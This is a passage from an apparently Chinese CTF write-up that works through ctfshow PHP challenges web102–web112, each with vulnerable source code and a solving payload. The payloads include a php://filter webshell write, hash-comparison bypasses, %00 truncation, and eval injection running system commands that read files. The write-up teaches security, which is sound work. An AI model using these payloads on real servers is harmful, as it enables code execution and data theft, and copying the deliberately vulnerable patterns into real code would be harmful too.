class="literal">false</span></span><br></pre></td></tr></table></figure><p>所以只能另想办法，要让v2均为数字，首先我们考虑写入1.php时，利用伪协议写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=？？？&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><p>关键就是什么代码base64编码后再转为十六进制为全数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  <span class="comment">// PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>同时因为经过substr处理，所以v2前面还要补00<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><p>之后访问1.php看源码即可。</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>同上一样，路径相同</p><h2 id="web104、106"><a href="#web104、106" class="headerlink" title="web104、106"></a>web104、106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:27:20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过利用数组绕过shal();<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post:v1[]=<span class="number">1</span>;get v2[]=<span class="number">2</span>;</span><br></pre></td></tr></table></figure><h2 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>看到本体，有点懵，但是却有一个关键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br></pre></td></tr></table></figure><p>因此只要我们可以对$error传参就可以传出flag；<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?a=flag   POST:  <span class="built_in">error</span>=a;</span><br></pre></td></tr></table></figure><p>通过get进一个参数使他为flag，并将a赋给error利用die()函数得到flag</p><p>还有一个payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suces=flag&amp;flag=  <span class="comment">//不太理解</span></span><br></pre></td></tr></table></figure><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:24:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到题目可以发现，我们需要了解parse_str()函数的意思</p><blockquote><p>parse_str(string,array)：string为解析的字符串，array为存储变量的数组的名称。该参数指示变量将被存储到数组中</p></blockquote><p>因此可以通过以下路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST v1=flag=<span class="literal">NULL</span>  GET ?v3[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>从而得到flag</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="built_in">error</span></span><br></pre></td></tr></table></figure><p>通过本题可以看到ereg（）函数该函数可以用%00来截断<br>strrev（）字符串反转<br>intval（）取整<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br></pre></td></tr></table></figure><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:02:34</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只要有字母便可以，因此找到不会报错的类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span>  <span class="comment">// 错误类</span></span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">Exception</span>();system(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">v1=ReflectionClass&amp;v2=system(<span class="string">&#x27;tac f*&#x27;</span>)</span><br><span class="line">?v1=ReflectionClass(<span class="string">&quot;PDO&quot;</span>);system(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure><p>中间那个，可以不闭合的原理就是因为先执行的system，然后才报的错。你可以理解成phpinfo(system(“ls”));，先执行的system。</p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:49:10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到题目后就会发现上题的解法无法使用，同时不能出现上面匹配的字符<br>看大佬博客发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span>()<span class="comment">//这个函数可以的到当前路径下的文件操作如下</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$a</span>-&gt;valid())&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;getFilename().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$a</span>-&gt;next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当前路径下的文件</span></span><br><span class="line"><span class="number">103</span>.php</span><br><span class="line">ssrf.php</span><br><span class="line">text.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此只要出现‘.’便可以出现题解，对于点我们可以使用getcwd（）函数来替代</p><blockquote><p>getcwd() ：获取当前工作目录</p></blockquote><p>从而获得路径<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="built_in">FilesystemIterator</span>&amp;&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察$GLOBALS变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span> — 引用全局作用域中可用的全部变量</span><br><span class="line">一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c147bbde0c8c4eb58a7aba2f4843ebd3.png" alt="在这里插入图片描述"><br>通过图片可以看到该变量可以返回我们写的变量，那是不是在这道题中可以返回$flag!<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span 